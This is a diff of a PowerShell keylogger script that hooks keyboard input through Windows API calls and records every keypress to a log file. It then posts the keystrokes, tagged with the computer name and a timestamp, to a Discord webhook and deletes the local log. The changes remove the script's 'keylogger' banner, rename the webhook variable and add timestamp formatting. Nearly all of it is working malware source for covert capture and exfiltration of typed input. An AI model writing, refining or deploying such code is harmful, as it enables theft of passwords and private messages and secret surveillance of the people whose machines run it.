@@ -1,5 +1,5 @@
 <#
-============================================= Beigeworm's intellegent keylogger ========================================================
+
 
 SYNOPSIS
 This script gathers Keypress information and posts to a discord webhook address with the results only
@@ -15,7 +15,7 @@ USAGE
 #>
 
 # User Setup
-$hookurl = "DISCORD_WEBHOOK HERE"
+$dc = "WEBHOOK_HERE"
 
 # Import DLL Definitions for keyboard inputs
 $API = @'
@@ -66,7 +66,7 @@ While ($true){
             if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
               # Check for non-character keys
               $LString = $logchar.ToString()
-                if ($asc -eq 8) {$LString = "[BKSPC]"}
+                if ($asc -eq 8) {$LString = "[BKSP]"}
                 if ($asc -eq 13) {$LString = "[ENT]"}
                 if ($asc -eq 27) {$LString = "[ESC]"}
             # Add the key to the file
@@ -81,7 +81,9 @@ While ($true){
       # Send the saved keys to a webhook
       $fileContent = Get-Content -Path $logPath -Raw
       $escmsgsys = $fileContent -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
+      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
+      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
       Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
       #Remove log file and reset inactivity check 
       Remove-Item -Path $logPath -Force
